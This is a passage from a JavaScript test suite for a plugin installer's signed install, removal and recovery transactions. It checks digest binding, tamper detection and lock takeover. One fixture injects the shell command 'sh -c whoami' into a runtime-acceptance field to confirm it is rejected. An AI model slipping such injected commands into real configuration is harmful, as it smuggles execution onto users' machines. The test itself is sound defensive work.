  assert.match(prepared.installSpec, /\.tgz$/u);

  const changedMetadata = Buffer.from(fixture.metadataBytes.toString('utf8').replace('2.3.4', '2.3.5'));
  const changedPath = join(root, 'changed-metadata.json');
  await writeFile(changedPath, changedMetadata);
  await assert.rejects(
    () => prepareUpstream({
      item: fixture.item,
      artifact,
      resolution: changedPath,
      output: join(root, 'rejected'),
    }),
    /metadata digest mismatch/
  );
});

test('exact GitHub Release preparation binds repository, tag, asset URL, manifest, and digest', async (t) => {
  const root = await workspace(t);
  const fixture = upstreamArtifactFixture({ type: 'github-release-asset' });
  const artifact = join(root, 'release-plugin.tgz');
  await writeFile(artifact, fixture.bytes);
  await prepareUpstream({ item: fixture.item, artifact, output: join(root, 'prepared') });
  const prepared = await validatePrepared(join(root, 'prepared'), fixture.item);
  assert.equal(prepared.record.sourceType, 'github-release-asset');
  assert.equal(prepared.record.evidence.artifactSha256, fixture.item.distribution.source.assetSha256);

  const tainted = structuredClone(fixture.item);
  tainted.distribution.source.assetUrl = tainted.distribution.source.assetUrl.replace('/v2.3.4/', '/latest/');
  assert.throws(() => validateItem(tainted), /GitHub Release source/);
});

test('hosted preparation re-hashes bytes and binds a private prepared record', async (t) => {
  const root = await workspace(t);
  const fixture = hostedFixture();
  const artifact = join(root, 'plugin.tgz');
  const output = join(root, 'prepared');
  await writeFile(artifact, fixture.bytes, { mode: 0o600 });
  await prepareHosted({ item: fixture.item, artifact, output });
  const prepared = await validatePrepared(output, fixture.item);
  assert.equal(prepared.record.catalogId, fixture.item.catalogId);
  assert.equal(prepared.record.evidence.artifactSha256, fixture.item.distribution.artifactSha256);
  assert.match(prepared.installSpec, new RegExp(`${fixture.item.distribution.artifactSha256}\\.tgz$`));
});

test('batch preflight validates every prepared member before aggregate consent', async (t) => {
  const root = await workspace(t);
  const preparedRoot = join(root, 'prepared');
  await mkdir(preparedRoot);
  const first = hostedFixture({ id: 3006, slug: 'preflight-one', name: 'dsh-preflight-one' });
  const second = hostedFixture({ id: 3052, slug: 'preflight-two', name: 'dsh-preflight-two' });
  const firstArtifact = join(root, 'first.tgz');
  const secondArtifact = join(root, 'second.tgz');
  await writeFile(firstArtifact, first.bytes);
  await writeFile(secondArtifact, second.bytes);
  await prepareHosted({ item: first.item, artifact: firstArtifact, output: join(preparedRoot, '3006') });
  await prepareHosted({ item: second.item, artifact: secondArtifact, output: join(preparedRoot, '3052') });
  assert.deepEqual(
    await preflightPrepared(preparedRoot, [first.item, second.item]),
    {
      preparedRoot: await realpath(preparedRoot),
      preparedItemCount: 2,
      catalogIds: [3006, 3052],
      allPreparedAuthorityMatched: true,
    }
  );
  const secondPreparedArtifact = (await readFile(join(preparedRoot, '3052', 'prepared.json'), 'utf8'));
  const secondRecord = JSON.parse(secondPreparedArtifact);
  await writeFile(join(preparedRoot, '3052', secondRecord.install.artifactFile), Buffer.from('tampered'));
  await assert.rejects(
    () => preflightPrepared(preparedRoot, [first.item, second.item]),
    /byte count|SHA-256/
  );
});

test('transaction planning resolves exact authority members and production execution rejects test bypasses', async () => {
  const loaded = await loadAuthority();
  const first = hostedFixture({ id: 3006, slug: 'fixture-one', name: 'dsh-fixture-one' });
  const second = hostedFixture({ id: 3052, slug: 'fixture-two', name: 'dsh-fixture-two' });
  const promoted = promotedContext(loaded, fullItemSet([first.item, second.item]));
  const planOptions = {
    top10ReleaseSet: promoted.top10ReleaseSet,
    validationOptions: promoted.validationOptions,
  };
  const planned = buildPlan(promoted.authority, ['#3006', '#3052'], planOptions);
  assert.deepEqual(planned.items.map((item) => item.catalogId), [3006, 3052]);
  assert.deepEqual(planned.plan.plugins.map((item) => item.catalogId), [3006, 3052]);
  assert.equal(planned.plan.plugins[0].distribution.assetName, first.item.distribution.assetName);
  assert.equal(planned.plan.plugins[0].distribution.artifactUrl, first.item.distribution.artifactUrl);
  assert.deepEqual(planned.plan.plugins[0].runtimeAcceptance, first.item.runtimeAcceptance);
  assert.throws(
    () => buildPlan(promoted.authority, ['#3999'], planOptions),
    /lacks one exact verified authority record/
  );
  const liveLifecycle = gitFixture();
  const livePromoted = promotedContext(loaded, fullItemSet([liveLifecycle]));
  assert.throws(
    () => buildPlan(livePromoted.authority, ['#3052'], {
      top10ReleaseSet: livePromoted.top10ReleaseSet,
      validationOptions: livePromoted.validationOptions,
    }),
    /requires a live lifecycle build/u
  );
  const top10 = buildPlan(promoted.authority, [], { ...planOptions, top10: true });
  assert.deepEqual(
    top10.items.map((item) => item.catalogId),
    promoted.top10ReleaseSet.entries.map((entry) => entry.catalogId)
  );
  const unfrozen = structuredClone(promoted.top10ReleaseSet);
  unfrozen.frozen = false;
  assert.throws(
    () => buildPlan(promoted.authority, [], {
      top10: true,
      top10ReleaseSet: unfrozen,
      validationOptions: promoted.validationOptions,
    }),
    /evidence-pending|payload digest|pending Top10|exact release-set bytes/i
  );
  await assert.rejects(
    () => executeTransaction({
      authority: promoted.authority,
      items: planned.items,
      planSha256: planned.planSha256,
      consentSha256: planned.planSha256,
      dshHome: '/private/dsh-home',
      harnessSource: '/private/source',
      harnessReceipt: '/private/receipt.json',
      preparedRoot: '/private/prepared',
      transactionRoot: '/private/transaction',
      runner: async () => ({ code: 0 }),
      skipHarnessGate: true,
      builtCli: process.execPath,
    }),
    /must not contain injected runners, items, plans, or Harness gate bypasses/
  );
});

test('removal planning is authority-bound and removal/recovery executors reject injected operations', async () => {
  assert.doesNotThrow(() => assertPrivateRecoveryPlatform('darwin'));
  assert.doesNotThrow(() => assertPrivateRecoveryPlatform('linux'));
  assert.doesNotThrow(() => assertPrivateRecoveryPlatform('win32'));
  assert.throws(() => assertPrivateRecoveryPlatform('freebsd'), /unsupported on freebsd/);
  const loaded = await loadAuthority();
  const first = hostedFixture({ id: 3006, slug: 'remove-one', name: 'dsh-remove-one' });
  const second = hostedFixture({ id: 3052, slug: 'remove-two', name: 'dsh-remove-two' });
  const promoted = promotedContext(loaded, fullItemSet([first.item, second.item]));
  const planned = buildRemovalPlan(promoted.authority, ['#3006', '#3052'], {
    top10ReleaseSet: promoted.top10ReleaseSet,
    validationOptions: promoted.validationOptions,
  });
  assert.equal(planned.plan.action, 'remove');
  assert.equal(planned.plan.executionOrder, 'reverse-plan-order');
  assert.deepEqual(planned.plan.plugins, [
    {
      catalogId: 3006,
      package: { name: 'dsh-remove-one', version: '1.0.0' },
      removePackage: 'dsh-remove-one',
      coldRestartRequired: true,
    },
    {
      catalogId: 3052,
      package: { name: 'dsh-remove-two', version: '1.0.0' },
      removePackage: 'dsh-remove-two',
      coldRestartRequired: true,
    },
  ]);
  const install = buildPlan(promoted.authority, ['#3006'], {
    top10ReleaseSet: promoted.top10ReleaseSet,
    validationOptions: promoted.validationOptions,
  });
  const installSource = {
    plan: install.plan,
    planSha256: install.planSha256,
    catalogIds: [3006],
    state: {
      status: 'committed',
      runtimeAcceptance: {
        schemaVersion: 1,
        accepted: [{
          catalogId: 3006,
          entryId: first.item.runtimeAcceptance.dumpConfig.entryId,
          packageName: first.item.package.name,
          version: first.item.package.version,
        }],
        dumpConfigVerified: true,
        inventoryVerifiedBeforeAndAfterRestart: true,
        unauthenticatedRootStatus: 401,
      },
    },
  };
  bindRecoverySourceToAuthority(
    installSource,
    { top10ReleaseSet: promoted.top10ReleaseSet },
    promoted.authority,
    promoted.validationOptions
  );
  installSource.state.runtimeAcceptance.accepted[0].command = 'sh -c whoami';
  assert.throws(
    () => bindRecoverySourceToAuthority(
      installSource,
      { top10ReleaseSet: promoted.top10ReleaseSet },
      promoted.authority,
      promoted.validationOptions
    ),
    /source runtime acceptance #3006 is malformed|unsupported executable fields/
  );
  await assert.rejects(
    () => executeRemovalTransaction({
      authorityContext: {},
      consentSha256: planned.planSha256,
      dshHome: '/private/dsh-home',
      harnessReceipt: '/private/receipt.json',
      harnessSource: '/private/source',
      ids: ['#3006'],
      top10: false,
      transactionRoot: '/private/remove',
      runner: () => ({ code: 0 }),
    }),
    /must not contain injected runners/
  );
  await assert.rejects(
    () => executeRecoveryTransaction({
      authorityContext: {},
      consentSha256: 'a'.repeat(64),
      dshHome: '/private/dsh-home',
      harnessReceipt: '/private/receipt.json',
      harnessSource: '/private/source',
      sourceTransactionRoot: '/private/source-transaction',
      transactionRoot: '/private/recovery',
      snapshot: {},
    }),
    /must not contain injected runners, plans, snapshots/
  );
});

test('retained recovery uses nonce-scoped opaque bindings instead of secret-derived public digests', async (t) => {
  const root = await realpath(await workspace(t));
  const dshHome = join(root, 'dsh-home');
  const profile = join(dshHome, 'profiles', 'web');
  const transaction = join(root, 'source-transaction');
  const snapshot = join(transaction, 'snapshot');
  await mkdir(profile, { recursive: true });
  await mkdir(transaction, { mode: 0o700 });
  if (process.platform === 'win32') {
    const transactionIdentity = await captureWindowsPrivatePathIdentity(
      transaction,
      'directory'
    );
    await secureWindowsPrivatePath(transaction, 'directory', 'configure', {
      expectedIdentity: transactionIdentity,
    });
  }
  await writeFile(join(profile, 'package.json'), `${JSON.stringify({
    name: 'dsh-profile-web',
    private: true,
    dependencies: {},
    dsh: {
      profile: {
        bundles: ['@deepseek-ai/dsh-base', '@deepseek-ai/dsh-web-app'],
        patchReload: 'live',
      },
    },
  }, null, 2)}\n`);
  await writeFile(join(profile, 'pnpm-lock.yaml'), 'lockfileVersion: 9.0\n');
  await writeFile(
    join(profile, 'pnpm-workspace.yaml'),
    'packages:\n  - .\n\nnodeLinker: hoisted\nautoInstallPeers: false\n'
  );
  await writeFile(join(profile, 'cordis.patch.yml'), '[]\n');
  const credentialBytes = Buffer.from('provider:\n  token: private-recovery-fixture\n');
  await writeFile(join(dshHome, '.credentials.yaml'), credentialBytes, { mode: 0o600 });
  const closure = await captureProfileClosure(profile);
  await createProfileSnapshot(dshHome, profile, snapshot);

  const loaded = await loadAuthority();
  const fixture = hostedFixture({ id: 3006, slug: 'recover-one', name: 'dsh-recover-one' });
  const promoted = promotedContext(loaded, fullItemSet([fixture.item]));
  const removal = buildRemovalPlan(promoted.authority, ['#3006'], {
    top10ReleaseSet: promoted.top10ReleaseSet,
    validationOptions: promoted.validationOptions,
  });
  const planRecord = {
    schemaVersion: 1,
    planSha256: removal.planSha256,
    catalogIds: [3006],
    plan: removal.plan,
  };
  const baselineRecord = { schemaVersion: 1, closure, inventory: {} };
  const baselineBytes = Buffer.from(`${JSON.stringify(baselineRecord, null, 2)}\n`);
  const snapshotManifestBytes = await readFile(join(snapshot, 'snapshot.json'));
  const recoveryKey = randomBytes(32);
  const transactionNonce = randomBytes(32);
  const rollbackBaselineBinding = buildPrivateRecoveryBinding(
    baselineBytes,
    recoveryKey,
    transactionNonce,
    'rollback-baseline'
  );
  const snapshotManifestBinding = buildPrivateRecoveryBinding(
    snapshotManifestBytes,
    recoveryKey,
    transactionNonce,
    'snapshot-manifest'
  );
  const terminalClosureBinding = buildPrivateRecoveryBinding(
    Buffer.from(`${JSON.stringify(stable(closure), null, 2)}\n`),
    recoveryKey,
    transactionNonce,
    'terminal-closure'
  );
  const terminalInventoryBinding = buildPrivateRecoveryBinding(
    Buffer.from('{}\n'),
    recoveryKey,
    transactionNonce,
    'terminal-inventory'
  );
  const terminalManagedBytes = await captureManagedFileBindingInput(dshHome, profile);
  const terminalManagedFilesBinding = buildPrivateRecoveryBinding(
    terminalManagedBytes,
    recoveryKey,
    transactionNonce,
    'terminal-managed-files'
  );
  terminalManagedBytes.fill(0);
  const state = {
    schemaVersion: 2,
    transactionId: randomBytes(16).toString('hex'),
    status: 'removed',
    planSha256: removal.planSha256,
    catalogIds: [3006],
    atomic: false,
    coldRestartVerified: true,
    rollbackBaselineBinding,
    snapshotManifestBinding,
    terminalClosureBinding,
    terminalInventoryBinding,
    terminalManagedFilesBinding,
    removalVerified: true,
  };
  const authentication = buildRecoveryAuthentication(state, recoveryKey, transactionNonce);
  const secondNonceBinding = buildPrivateRecoveryBinding(
    snapshotManifestBytes,
    recoveryKey,
    randomBytes(32),
    'snapshot-manifest'
  );
  assert.notEqual(snapshotManifestBinding, sha256(snapshotManifestBytes));
  assert.notEqual(snapshotManifestBinding, secondNonceBinding);
  assert.doesNotMatch(JSON.stringify(state), new RegExp(sha256(snapshotManifestBytes)));
  assert.doesNotMatch(JSON.stringify(state), new RegExp(sha256(credentialBytes)));
  assert.doesNotMatch(JSON.stringify(state), new RegExp(closure.closureSha256));
  const publicState = publicTerminalState(state);
  assert.equal(Object.hasOwn(publicState, 'rollbackBaselineBinding'), false);
  assert.equal(Object.hasOwn(publicState, 'snapshotManifestBinding'), false);
  assert.equal(Object.hasOwn(publicState, 'terminalClosureBinding'), false);
  assert.equal(Object.hasOwn(publicState, 'terminalInventoryBinding'), false);
  assert.equal(Object.hasOwn(publicState, 'terminalManagedFilesBinding'), false);
  await writeFile(
    join(transaction, 'plan.json'),
    `${JSON.stringify(planRecord, null, 2)}\n`,
    { mode: 0o600 }
  );
  await writeFile(join(transaction, 'rollback-baseline.json'), baselineBytes, { mode: 0o600 });
  await writeFile(
    join(transaction, 'state.json'),
    `${JSON.stringify(state, null, 2)}\n`,
    { mode: 0o600 }
  );
  await writeFile(
    join(transaction, 'recovery-auth.json'),
    `${JSON.stringify(authentication, null, 2)}\n`,
    { mode: 0o600 }
  );
  await writeFile(join(transaction, 'in-progress.json'), 'not-json-and-must-never-be-read\n', {
    mode: 0o666,
  });
  if (process.platform === 'win32') {
    await secureWindowsPrivatePaths(await Promise.all([
      'plan.json',
      'rollback-baseline.json',
      'state.json',
      'recovery-auth.json',
      'in-progress.json',
    ].map(async (name) => {
      const path = join(transaction, name);
      return {
        path,
        kind: 'file',
        action: 'configure',
        expectedIdentity: await captureWindowsPrivatePathIdentity(path, 'file'),
      };
    })));
  }

  const source = await loadRecoverySource(transaction, recoveryKey);
  assert.equal(source.kind, 'terminal');
  assert.equal(
    await verifyTerminalManagedFilesBinding(source, dshHome, profile, recoveryKey),
    true
  );
  assert.equal(
    await verifyTerminalSnapshotManagedFilesBinding(
      source,
      snapshot,
      recoveryKey
    ),
    true
  );
  await writeFile(join(dshHome, 'settings.yaml'), 'unexpected-terminal-setting: true\n', {
    mode: 0o600,
  });
  await assert.rejects(
    () => verifyTerminalManagedFilesBinding(source, dshHome, profile, recoveryKey),
    /governed DSH_HOME files have drifted/
  );
  await rm(join(dshHome, 'settings.yaml'));
  await writeFile(join(dshHome, '.credentials.yaml'), 'provider:\n  token: changed-after-terminal\n', {
    mode: 0o600,
  });
  await assert.rejects(
    () => verifyTerminalManagedFilesBinding(source, dshHome, profile, recoveryKey),
    /governed DSH_HOME files have drifted/
  );
  await writeFile(join(dshHome, '.credentials.yaml'), credentialBytes, { mode: 0o600 });
  if (process.platform !== 'win32') {
    await chmod(join(dshHome, '.credentials.yaml'), 0o640);
    await assert.rejects(
      () => verifyTerminalManagedFilesBinding(source, dshHome, profile, recoveryKey),
      /governed DSH_HOME files have drifted/
    );
    await chmod(join(dshHome, '.credentials.yaml'), 0o600);
  }
  const statePath = join(transaction, 'state.json');
  const stateAlias = join(transaction, 'state-hardlink.json');
  await link(statePath, stateAlias);
  await assert.rejects(
    () => loadRecoverySource(transaction, recoveryKey),
    /single-link file/
  );
  await rm(stateAlias);
  const retainedStatePath = join(transaction, 'state.retained.json');
  await rename(statePath, retainedStatePath);
  await writeFile(
    statePath,
    `${JSON.stringify({ ...state, coldRestartVerified: false }, null, 2)}\n`,
    { mode: 0o600 }
  );
  if (process.platform === 'win32') {
    const stateIdentity = await captureWindowsPrivatePathIdentity(statePath, 'file');
    await secureWindowsPrivatePath(statePath, 'file', 'configure', {
      expectedIdentity: stateIdentity,
    });
  }
  await assert.rejects(
    () => loadRecoverySource(transaction, recoveryKey),
    /does not match its plan|not authenticated/
  );
  await rm(statePath);
  await rename(retainedStatePath, statePath);
  bindRecoverySourceToAuthority(
    source,
    { top10ReleaseSet: promoted.top10ReleaseSet },
    promoted.authority,
    promoted.validationOptions
  );
  const recovery = buildRecoveryPlan(source);
  assert.equal(recovery.plan.action, 'recover');
  assert.equal(recovery.plan.sourceTransaction.transactionId, state.transactionId);
  assert.equal(recovery.plan.sourceTransaction.status, 'removed');
  assert.equal(recovery.plan.restoreTarget.authenticatedPrivateClosure, true);
  assert.equal(recovery.plan.restoreTarget.authenticatedPrivateInventory, true);
  assert.equal(recovery.plan.sourceTransaction.authenticatedPrivateSnapshot, true);
  assert.equal(recovery.plan.sourceTransaction.authenticatedTerminalState, true);
  assert.equal(Object.hasOwn(recovery.plan.sourceTransaction, 'snapshotManifestBinding'), false);
  assert.doesNotMatch(JSON.stringify(recovery.plan), new RegExp(sha256(snapshotManifestBytes)));
  assert.doesNotMatch(JSON.stringify(recovery.plan), new RegExp(closure.closureSha256));
  assert.equal(
    recovery.planSha256,
    sha256(Buffer.from(`${JSON.stringify(stable(recovery.plan))}\n`))
  );
  await assert.rejects(
    () => loadRecoverySource(transaction, randomBytes(32)),
    /not authenticated by this DSH_HOME recovery trust root/
  );
  const forgedPlan = structuredClone(source);
  forgedPlan.plan.plugins[0].removePackage = 'dsh-attacker';
  assert.throws(
    () => bindRecoverySourceToAuthority(
      forgedPlan,
      { top10ReleaseSet: promoted.top10ReleaseSet },
      promoted.authority,
      promoted.validationOptions
    ),
    /exact plan reconstructed from current authority/
  );

  await writeFile(
    join(transaction, 'rollback-baseline.json'),
    `${JSON.stringify({ ...baselineRecord, inventory: { tampered: '1.0.0' } }, null, 2)}\n`,
    { mode: 0o600 }
  );
  await assert.rejects(
    () => loadRecoverySource(transaction, recoveryKey),
    /rollback baseline private binding mismatch/
  );
});

test('recovery trust root creates and reloads one private 32-byte key', async (t) => {
  const dshHome = await realpath(await workspace(t));
  const created = await loadRecoveryKey(dshHome, { create: true });
  assert.equal(created.length, 32);
  assert.deepEqual(await loadRecoveryKey(dshHome), created);
  const root = join(dshHome, '.dsh-plugin-installer');
  const key = join(root, 'hmac-sha256.key');
  const rootStat = await lstat(root);
  const keyStat = await lstat(key);
  assert.equal(rootStat.isDirectory(), true);
  assert.equal(rootStat.isSymbolicLink(), false);
  assert.equal(keyStat.isFile(), true);
  assert.equal(keyStat.isSymbolicLink(), false);
  if (process.platform !== 'win32') {
    assert.equal(rootStat.mode & 0o077, 0);
    assert.equal(keyStat.mode & 0o077, 0);
  } else {
    const [rootProof, keyProof] = await secureWindowsPrivatePaths([
      {
        path: root,
        kind: 'directory',
        action: 'verify',
        expectedIdentity: await captureWindowsPrivatePathIdentity(root, 'directory'),
      },
      {
        path: key,
        kind: 'file',
        action: 'verify',
        expectedIdentity: await captureWindowsPrivatePathIdentity(key, 'file'),
      },
    ]);
    assert.equal(rootProof.ownerSid, rootProof.currentSid);
    assert.equal(rootProof.ruleCount, 1);
    assert.equal(rootProof.ruleSid, rootProof.currentSid);
    assert.equal(rootProof.protected, true);
    assert.equal(rootProof.inherited, false);
    assert.equal(rootProof.inheritanceFlags, 3);
    assert.equal(keyProof.ownerSid, keyProof.currentSid);
    assert.equal(keyProof.ruleCount, 1);
    assert.equal(keyProof.ruleSid, keyProof.currentSid);
    assert.equal(keyProof.protected, true);
    assert.equal(keyProof.inherited, false);
    assert.equal(keyProof.inheritanceFlags, 0);
  }
});

test('DSH_HOME transaction lock is exclusive and only explicit matching recovery takes stale ownership', async (t) => {
  const root = await realpath(await workspace(t));
  const dshHome = join(root, 'dsh-home');
  const firstTransaction = join(root, 'first-transaction');
  const secondTransaction = join(root, 'second-transaction');
  const recoveryTransaction = join(root, 'recovery-transaction');
  await mkdir(dshHome);
  await mkdir(firstTransaction);
  await mkdir(secondTransaction);
  await mkdir(recoveryTransaction);

  const stalePid = 2_000_000_000;
  const firstLock = await acquireTransactionLock(dshHome, firstTransaction, {
    operation: 'install',
    pid: stalePid,
  });
  await assert.rejects(
    () => acquireTransactionLock(dshHome, secondTransaction, { operation: 'remove' }),
    /another DSH_HOME transaction is locked.*explicit recovery/
  );
  await assert.rejects(
    () => acquireTransactionLock(dshHome, recoveryTransaction, {
      operation: 'recover',
      recoverySourceTransactionRoot: secondTransaction,
      processAlive: () => false,
    }),
    /does not match the explicit recovery source/
  );
  await assert.rejects(
    () => acquireTransactionLock(dshHome, recoveryTransaction, {
      operation: 'recover',
      recoverySourceTransactionRoot: firstTransaction,
      processAlive: () => true,
    }),
    /lock holder is still active/
  );

  const recoveryLock = await acquireTransactionLock(dshHome, recoveryTransaction, {
    operation: 'recover',
    recoverySourceTransactionRoot: firstTransaction,
    processAlive: () => false,
  });
  assert.notEqual(recoveryLock.lockId, firstLock.lockId);
  await releaseTransactionLock(recoveryLock);
  await assert.rejects(() => lstat(recoveryLock.lockRoot), { code: 'ENOENT' });
});

test('authenticated interrupted journal requires exact stale holder, separate consent, and single-winner takeover', async (t) => {
  const root = await realpath(await workspace(t));
  const dshHome = join(root, 'dsh-home');
  const profile = join(dshHome, 'profiles', 'web');
  const sourceTransaction = join(root, 'interrupted-source');
  const snapshot = join(sourceTransaction, 'snapshot');
  const recoveryOne = join(root, 'recovery-one');
  const recoveryTwo = join(root, 'recovery-two');
  const blockedTransaction = join(root, 'blocked-transaction');
  await mkdir(profile, { recursive: true });
  await mkdir(sourceTransaction, { mode: 0o700 });
  if (process.platform === 'win32') {
    const sourceTransactionIdentity = await captureWindowsPrivatePathIdentity(
      sourceTransaction,
      'directory'
    );
    await secureWindowsPrivatePath(sourceTransaction, 'directory', 'configure', {
      expectedIdentity: sourceTransactionIdentity,
    });
  }
  await mkdir(recoveryOne, { mode: 0o700 });
  await mkdir(recoveryTwo, { mode: 0o700 });
  await mkdir(blockedTransaction, { mode: 0o700 });
  await writeFile(join(profile, 'package.json'), `${JSON.stringify({
    name: 'dsh-profile-web',
    private: true,
    dependencies: {},
    dsh: {
      profile: {
        bundles: ['@deepseek-ai/dsh-base', '@deepseek-ai/dsh-web-app'],
        patchReload: 'live',
      },
    },
  }, null, 2)}\n`);
  await writeFile(join(profile, 'pnpm-lock.yaml'), 'lockfileVersion: 9.0\n');
  await writeFile(
    join(profile, 'pnpm-workspace.yaml'),
    'packages:\n  - .\n\nnodeLinker: hoisted\nautoInstallPeers: false\n'
  );
  await writeFile(join(profile, 'cordis.patch.yml'), '[]\n');
  const closure = await captureProfileClosure(profile);
  await createProfileSnapshot(dshHome, profile, snapshot);

  const loaded = await loadAuthority();
  const fixture = hostedFixture({ id: 3006, slug: 'interrupted-one', name: 'dsh-interrupted-one' });
  const promoted = promotedContext(loaded, fullItemSet([fixture.item]));
  const removal = buildRemovalPlan(promoted.authority, ['#3006'], {
    top10ReleaseSet: promoted.top10ReleaseSet,
    validationOptions: promoted.validationOptions,
  });
  const planRecord = {
    schemaVersion: 1,
    planSha256: removal.planSha256,
    catalogIds: [3006],
    plan: removal.plan,
  };
  const baselineRecord = { schemaVersion: 1, closure, inventory: {} };
  const baselineBytes = Buffer.from(`${JSON.stringify(baselineRecord, null, 2)}\n`);
  const snapshotManifestBytes = await readFile(join(snapshot, 'snapshot.json'));
  await writeFile(
    join(sourceTransaction, 'plan.json'),
    `${JSON.stringify(planRecord, null, 2)}\n`,
    { mode: 0o600 }
  );
  await writeFile(join(sourceTransaction, 'rollback-baseline.json'), baselineBytes, { mode: 0o600 });
  const recoveryKey = await loadRecoveryKey(dshHome, { create: true });
  const stalePid = 2_000_000_000;
  const staleLock = await acquireTransactionLock(dshHome, sourceTransaction, {
    operation: 'remove',
    pid: stalePid,
  });
  const transactionNonce = randomBytes(32);
  const state = {
    schemaVersion: 2,
    transactionId: randomBytes(16).toString('hex'),
    status: 'in-progress',
    action: 'remove',
    planSha256: removal.planSha256,
    catalogIds: [3006],
    atomic: false,
    rollbackBaselineBinding: buildPrivateRecoveryBinding(
      baselineBytes,
      recoveryKey,
      transactionNonce,
      'rollback-baseline'
    ),
    snapshotManifestBinding: buildPrivateRecoveryBinding(
      snapshotManifestBytes,
      recoveryKey,
      transactionNonce,
      'snapshot-manifest'
    ),
    holder: {
      schemaVersion: 1,
      lockId: staleLock.lockId,
      pid: staleLock.pid,
      processIdentity: staleLock.processIdentity,
      operation: 'remove',
      transactionRoot: sourceTransaction,
    },
  };
  const authentication = buildRecoveryAuthentication(state, recoveryKey, transactionNonce);
  const journalPath = join(sourceTransaction, 'in-progress.json');
  const journal = { schemaVersion: 1, state, authentication };
  const journalBytes = Buffer.from(`${JSON.stringify(journal, null, 2)}\n`);
  await writeFile(journalPath, journalBytes, { mode: 0o600 });
  if (process.platform === 'win32') {
    await secureWindowsPrivatePaths(await Promise.all([
      'plan.json',
      'rollback-baseline.json',
      'in-progress.json',
    ].map(async (name) => {
      const path = join(sourceTransaction, name);
      return {
        path,
        kind: 'file',
        action: 'configure',
        expectedIdentity: await captureWindowsPrivatePathIdentity(path, 'file'),
      };
    })));
  }

  const source = await loadRecoverySource(sourceTransaction, recoveryKey);
  assert.equal(source.kind, 'interrupted');
  assert.equal(source.state.transactionId, state.transactionId);
  bindRecoverySourceToAuthority(
    source,
    { top10ReleaseSet: promoted.top10ReleaseSet },
    promoted.authority,
    promoted.validationOptions
  );
  assert.deepEqual(
    await validateInterruptedRecoveryLock(dshHome, source, {
      processAlive: () => false,
      processIdentity: () => null,
    }),
    { stale: true, ownerMatchesAuthenticatedJournal: true }
  );
  await assert.rejects(
    () => validateInterruptedRecoveryLock(dshHome, source, {
      processAlive: () => true,
      processIdentity: () => null,
    }),
    /holder is still active/
  );
  const recovery = buildRecoveryPlan(source);
  assert.equal(
    recovery.plan.sourceTransaction.recoveryMode,
    'authenticated-interrupted-rollback-from-matching-stale-holder'
  );
  assert.equal(recovery.plan.sourceTransaction.authenticatedTerminalState, false);
  assert.equal(recovery.plan.sourceTransaction.authenticatedInterruptedJournal, true);
  const authorityBytes = Buffer.from(`${JSON.stringify(promoted.authority, null, 2)}\n`);
  const executableAuthorityContext = {
    ...promoted,
    authorityBytes,
    authoritySha256: sha256(authorityBytes),
    harnessAuthorityBytes: loaded.harnessAuthorityBytes,
    migrationMapBytes: loaded.migrationMapBytes,
    migrationMapSchemaBytes: loaded.migrationMapSchemaBytes,
    candidateIntakeBytes: loaded.candidateIntakeBytes,
    top10ReleaseSetSha256: sha256(promoted.top10ReleaseSetBytes),
  };
  await assert.rejects(
    () => executeRecoveryTransaction({
      authorityContext: executableAuthorityContext,
      consentSha256: '0'.repeat(64),
      dshHome,
      harnessReceipt: join(root, 'unreached-receipt.json'),
      harnessSource: root,
      sourceTransactionRoot: sourceTransaction,
      transactionRoot: join(root, 'unreached-recovery'),
    }),
    /explicit consent is not bound to this exact recovery plan digest/
  );

  const forgedState = structuredClone(state);
  forgedState.transactionId = randomBytes(16).toString('hex');
  await writeFile(
    journalPath,
    `${JSON.stringify({ ...journal, state: forgedState }, null, 2)}\n`,
    { mode: 0o600 }
  );
  await assert.rejects(
    () => loadRecoverySource(sourceTransaction, recoveryKey),
    /not authenticated by this DSH_HOME recovery trust root/
  );
  await writeFile(journalPath, journalBytes, { mode: 0o600 });

  const mismatchedHolderState = structuredClone(state);
  mismatchedHolderState.holder.lockId = 'f'.repeat(64);
  const mismatchedJournal = {
    schemaVersion: 1,
    state: mismatchedHolderState,
    authentication: buildRecoveryAuthentication(mismatchedHolderState, recoveryKey, transactionNonce),
  };
  await writeFile(journalPath, `${JSON.stringify(mismatchedJournal, null, 2)}\n`, { mode: 0o600 });
  const mismatchedSource = await loadRecoverySource(sourceTransaction, recoveryKey);
  await assert.rejects(
    () => validateInterruptedRecoveryLock(dshHome, mismatchedSource, {
      processAlive: () => false,
      processIdentity: () => null,
    }),
    /does not exactly match the authenticated interrupted journal holder/
  );
  await writeFile(journalPath, journalBytes, { mode: 0o600 });

  const attempts = await Promise.allSettled([
    acquireTransactionLock(dshHome, recoveryOne, {
      operation: 'recover',
      recoverySourceTransactionRoot: sourceTransaction,
      expectedRecoveryHolder: source.holder,
      processAlive: () => false,
      processIdentity: () => null,
    }),
    acquireTransactionLock(dshHome, recoveryTwo, {
      operation: 'recover',
      recoverySourceTransactionRoot: sourceTransaction,
      expectedRecoveryHolder: source.holder,
      processAlive: () => false,
      processIdentity: () => null,
    }),
  ]);
  const winners = attempts.filter((attempt) => attempt.status === 'fulfilled');
  const losers = attempts.filter((attempt) => attempt.status === 'rejected');
  assert.equal(winners.length, 1);
  assert.equal(losers.length, 1);
  assert.match(
    losers[0].reason.message,
    /takeover guard exists|does not exactly match the authenticated interrupted journal holder/
  );
  assert.equal(winners[0].value.takeoverOwner.lockId, staleLock.lockId);
  assert.equal(
    canReleaseTransactionLockAfterError(winners[0].value, false, new Error('pre-snapshot failure')),
    false
  );
  assert.equal(
    canReleaseTransactionLockAfterError(winners[0].value, true, new Error('post-snapshot failure')),
    false
  );
  const completedRollbackError = new Error('verified rollback');
  completedRollbackError.details = {
    attempted: true,
    baselineAvailable: true,
    filesRestored: true,
    closureRestored: true,
    inventoryRestored: true,
    coldStartProbePassed: true,
  };
  assert.equal(
    canReleaseTransactionLockAfterError(winners[0].value, true, completedRollbackError),
    true
  );
  const incompleteClosureRollbackError = new Error('dependency closure may be mixed');
  incompleteClosureRollbackError.details = {
    attempted: true,
    baselineAvailable: false,
    filesRestored: true,
    managedFilesVerified: 8,
    dependencyClosureMutationStarted: true,
  };
  assert.equal(
    canReleaseTransactionLockAfterError(
      winners[0].value,
      true,
      incompleteClosureRollbackError
    ),
    false
  );
  assert.equal(
    canReleaseTransactionLockAfterError({ takeoverOwner: null }, false, new Error('fresh failure')),
    true
  );
  await releaseTransactionLock(winners[0].value);

  const guardRoot = join(dshHome, '.dsh-plugin-installer', 'transaction-takeover.guard');
  await mkdir(guardRoot, { mode: 0o700 });
  await assert.rejects(
    () => acquireTransactionLock(dshHome, blockedTransaction, { operation: 'install' }),
    /takeover guard exists; explicit manual inspection is required/
  );
